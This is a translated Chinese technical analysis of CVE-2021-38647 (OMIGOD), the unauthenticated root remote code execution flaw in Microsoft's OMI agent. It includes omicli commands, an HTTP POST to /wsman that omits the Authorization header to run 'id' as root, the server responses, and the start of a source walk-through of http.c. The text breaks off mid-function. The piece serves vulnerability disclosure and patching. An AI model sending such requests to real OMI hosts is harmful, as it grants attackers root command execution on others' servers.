# OMIGOD：CVE-2021-38647 OMI远程代码执行漏洞分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 基本情况
微软在2021年9月的补丁更新中，修复了其[Open Management Infrastructure (OMI)
](https://github.com/microsoft/omi)中的多个漏洞，其中最为严重一个是远程代码执行漏洞，编号为[CVE-2021-38647](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)，也被称为OMIGOD，该漏洞影响OMI
1.6.8.0及以下版本。该漏洞能够在未授权情况下，远程以root权限执行任意命令，影响范围较大，CVSS评分9.8，建议存在漏洞版本尽快升级OMI版本。
## OMI介绍
OMI是微软开发并开源的远程配置管理工具，其主体使用C语言编写，主要用于UNIX/Linux系统上，类是与Windows系统的WMI，它允许用户远程管理配置并收集统计数据。OMI的抽象和易用特征，使得它在Azure中被广泛应用。在Azure
Linux服务器上，OMI Agent通常用于支持以下功能和服务：
  * Azure Automation
  * Azure Automatic Update
  * Azure Operations Management Suite
  * Azure Log Analytics
  * Azure Configuration Management
  * Azure Diagnostics
  * Azure Container Insights
在OMI独立安装、Azure Configuration Management或System Center Operations Manager
(SCOM)默认配置情况下，OMI的进程omiengine以root用户身份运行，并且默认会开启端 (通常为5986/5985/1270)
监听来至任意地址的连接。如下图所示：
这种配置正常情况下，用户认证之后，通过OMI可以远程管理配置Azure环境。
## 漏洞分析
###  漏洞成因
正常情况下，用户可以使用omicli连接远程服务端执行命令，例如可以执行查看id的命令：
    /opt/omi/bin/omicli --hostname xx.xx.xx.xx -u xxxx -p xxxx iv root/scx { SCX_OperatingSystem } ExecuteShellCommand { command 'id' timeout 0 }
则口令正确的情况下返回为：
    instance of ExecuteShellCommand
    {
        ReturnValue=true
        ReturnCode=0
        StdOut=uid=1000(xxxx) gid=1000(xxxx) groups=1000(xxxx),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
        StdErr=
    }
对应的数据包为：
    HTTP/1.1 200 OK
    Content-Length: 1415
    Connection: Keep-Alive
    Content-Type: application/soap+xml;charset=UTF-8
        http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous
        http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand
        uuid:6E73E6A0-C38A-0005-0000-000000020000
        uuid:0AB58087-C2C3-0005-0000-000000010000
            TRUE
            0
            uid=1000(xxxx) gid=1000(xxxx) groups=1000(xxxx),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
当口令错误的情况下返回的数据包如下：
    HTTP/1.1 401 Unauthorized
    Content-Length: 0
    WWW-Authenticate: Basic realm="WSMAN"
    WWW-Authenticate: Negotiate
    WWW-Authenticate: Kerberos
但是如果在发送执行命令请求数据包时，不带Authorization头，发送数据包如下：
    POST /wsman HTTP/1.1
    Connection: Keep-Alive
    Content-Length: 1505
    Content-Type: application/soap+xml;charset=UTF-8
    Host: xx.xx.xx.xx:5986
        HTTP://xx.xx.xx.xx:5986/wsman/
        http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem
            http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous
        http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand
        102400
        uuid:0AB58087-C2C3-0005-0000-000000010000
        PT1M30S
            root/scx
            id
            0
此时返回值为：
    HTTP/1.1 200 OK
    Content-Length: 1415
    Connection: Keep-Alive
    Content-Type: application/soap+xml;charset=UTF-8
        http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous
        http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand
        uuid:6E73E6A0-C38A-0005-0000-000000030000
        uuid:0AB58087-C2C3-0005-0000-000000010000
            TRUE
            0
            uid=0(root) gid=0(root) groups=0(root)
是不是非常的神奇，此时就出现了未认证情况下的远程代码执行情况，而且是以root用户权限的命令执行。
为什么会出现这个情况？
对照源代码进行分析，首先用户进行远程连接时，首先会进入http.c文件中的_ListenerCallback函数进行处理，该该函数为登录用户创建一个Http_Listener_SocketData并进行初始化，如下：
    static MI_Boolean _ListenerCallback(
        Selector* sel,
        Handler* handler_,
        MI_Uint32 mask,
        MI_Uint64 currentTimeUsec)
    {
        Http_Listener_SocketData* handler = (Http_Listener_SocketData*)handler_;    //创建Http_Listener_SocketData
        Http* self = (Http*)handler->base.data;
        MI_Result r;
        Sock s;
        Addr addr;
        Http_SR_SocketData* h;
        MI_UNUSED(sel);
        MI_UNUSED(mask);
        MI_UNUSED(currentTimeUsec);
        if (mask & SELECTOR_READ)
        {
            /* Accept the incoming connection */
            r = Sock_Accept(handler->base.sock, &s, &addr);
            if (MI_RESULT_WOULD_BLOCK == r)
                return MI_TRUE;
            if (r != MI_RESULT_OK)
            {
                trace_SockAccept_Failed(ENGINE_TYPE, Sock_GetLastError());
                return MI_TRUE;
            }
            r = Sock_SetBlocking(s, MI_FALSE);
            if (r != MI_RESULT_OK)
            {